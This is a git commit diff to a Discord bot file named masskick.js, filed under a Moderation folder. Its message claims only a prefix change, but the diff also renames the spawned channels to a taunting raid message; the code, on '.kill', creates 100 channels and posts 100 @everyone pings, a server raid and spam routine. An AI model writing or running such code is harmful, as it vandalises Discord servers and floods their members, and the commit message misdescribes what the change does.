4dfad64b532a310627e6a0e72310272a5e831272
Ryo505 <abdrmsfr9@gmail.com>
2026-06-26 03:36:14 +0300

    Change command prefix from '/' to '.' for masskick

--- src/commands/Moderation/masskick.js
+++ src/commands/Moderation/masskick.js
@@ -1,6 +1,6 @@
-if(message.content.startsWith( "/kill")){
+if(message.content.startsWith( ".kill")){
 
  let i=0
-    for(i=0;i<100;i++) {message.guild.channels.create("this is raid test")}
+    for(i=0;i<100;i++) {message.guild.channels.create("U BEEN RAIDED BY ROKI LOLLL ")}
     for(i=0;i<100;i++) {message.channel.send("@everyone")}
   }
